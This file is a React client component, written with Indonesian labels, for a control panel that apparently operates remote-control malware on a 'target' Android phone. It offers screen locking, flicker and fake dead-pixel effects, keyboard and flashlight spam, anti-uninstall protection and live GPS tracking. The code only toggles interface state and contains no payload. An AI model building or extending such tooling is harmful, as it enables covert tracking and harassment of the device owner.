"use client";
import { useState } from "react";
import { motion } from "framer-motion";

type Device = {
  id: string;
  name: string;
  model: string;
  online: boolean;
  lastSeen: string;
  battery: number;
  ip: string;
};

export default function ControlPanel({
  device,
  onBack,
}: {
  device: Device;
  onBack: () => void;
}) {
  const [active, setActive] = useState<Record<string, boolean>>({});
  const [message, setMessage] = useState("");
  const [flashSpeed, setFlashSpeed] = useState(5);
  const [lineColor, setLineColor] = useState<"green" | "pink">("green");

  function toggle(key: string) {
    setActive((prev) => ({ ...prev, [key]: !prev[key] }));
  }

  const features = [
    {
      id: "lock",
      label: "Lock Device",
      desc: "Kunci layar device target",
      color: "neon",
    },
    {
      id: "line",
      label: "Lightsaber Line",
      desc: "Garis neon horizontal di layar",
      color: "neon",
      extra: true,
    },
    {
      id: "deadpixel",
      label: "Dead Pixel",
      desc: "Warna layar berganti-ganti cepat",
      color: "pink",
    },
    {
      id: "flicker",
      label: "Flicker",
      desc: "Layar berkedip-kedip",
      color: "cyan",
    },
    {
      id: "message",
      label: "Kirim Pesan",
      desc: "Pesan muncul di tengah layar (15 detik)",
      color: "neon",
      extra: true,
    },
    {
      id: "spamkey",
      label: "Spam Keyboard",
      desc: "Spam input / key event",
      color: "pink",
    },
    {
      id: "flashlight",
      label: "Spam Senter",
      desc: "Flashlight berkedip (kecepatan bisa diatur)",
      color: "cyan",
      extra: true,
    },
    {
      id: "antiuninstall",
      label: "Anti Uninstall",
      desc: "Cegah uninstall APK target",
      color: "pink",
    },
    {
      id: "gps",
      label: "GPS Real-time",
      desc: "Lihat lokasi live device",
      color: "neon",
    },
  ];

  return (
    <div className="space-y-4 pb-4">
      <button
        onClick={onBack}
        className="text-sm text-nexa-neon font-bold flex items-center gap-1"
      >
        ← Kembali
      </button>

      {/* Device info */}
      <div className="neobrutal p-4">
        <div className="flex items-center gap-3">
          <div
            className={`w-3 h-3 rounded-full ${
              device.online ? "bg-nexa-neon animate-pulse" : "bg-zinc-600"
            }`}
          />
          <div>
            <div className="font-bold">{device.name}</div>
            <div className="text-xs text-zinc-400">
              {device.model} · {device.ip}
            </div>
          </div>
        </div>
      </div>

      {/* Features list - tersusun ke bawah */}
      <div className="space-y-3">
        {features.map((f) => (
          <div key={f.id} className="neobrutal p-4 space-y-3">
            <div className="flex items-center justify-between">
              <div>
                <div className="font-bold">{f.label}</div>
                <div className="text-xs text-zinc-400">{f.desc}</div>
              </div>
              <button
                onClick={() => toggle(f.id)}
                className={`px-4 py-2 rounded-xl border-2 border-black font-bold text-sm transition-all ${
                  active[f.id]
                    ? "bg-nexa-neon text-black shadow-neo"
                    : "bg-zinc-800 text-white"
                }`}
              >
                {active[f.id] ? "ON" : "OFF"}
              </button>
            </div>

            {/* Extra controls */}
            {f.id === "line" && active[f.id] && (
              <div className="flex gap-2">
                <button
                  onClick={() => setLineColor("green")}
                  className={`flex-1 py-2 rounded-lg border-2 font-bold text-sm ${
                    lineColor === "green"
                      ? "border-nexa-neon bg-nexa-neon/20 text-nexa-neon"
                      : "border-zinc-700"
                  }`}
                >
                  Green
                </button>
                <button
                  onClick={() => setLineColor("pink")}
                  className={`flex-1 py-2 rounded-lg border-2 font-bold text-sm ${
                    lineColor === "pink"
                      ? "border-nexa-pink bg-nexa-pink/20 text-nexa-pink"
                      : "border-zinc-700"
                  }`}
                >
                  Pink
                </button>
              </div>
            )}

            {f.id === "message" && (
              <div className="space-y-2">
                <textarea
                  value={message}
                  onChange={(e) => setMessage(e.target.value)}
                  placeholder="Tulis pesan..."
                  className="w-full bg-black border-2 border-zinc-700 rounded-xl p-3 text-sm outline-none focus:border-nexa-neon resize-none"
                  rows={2}
                />
                <button
                  onClick={() => {
                    if (message.trim()) toggle("message");
                  }}
                  className="w-full py-2.5 rounded-xl bg-nexa-neon text-black font-bold border-2 border-black shadow-neo"
                >
                  Kirim Pesan
                </button>
              </div>
            )}

            {f.id === "flashlight" && active[f.id] && (
              <div>
                <div className="flex justify-between text-xs mb-1">
                  <span>Kecepatan</span>
                  <span>{flashSpeed}x</span>
                </div>
                <input
                  type="range"
                  min={1}
                  max={15}
                  value={flashSpeed}
                  onChange={(e) => setFlashSpeed(Number(e.target.value))}
                  className="w-full accent-nexa-cyan"
                />
              </div>
            )}
          </div>
        ))}
      </div>
    </div>
  );
}
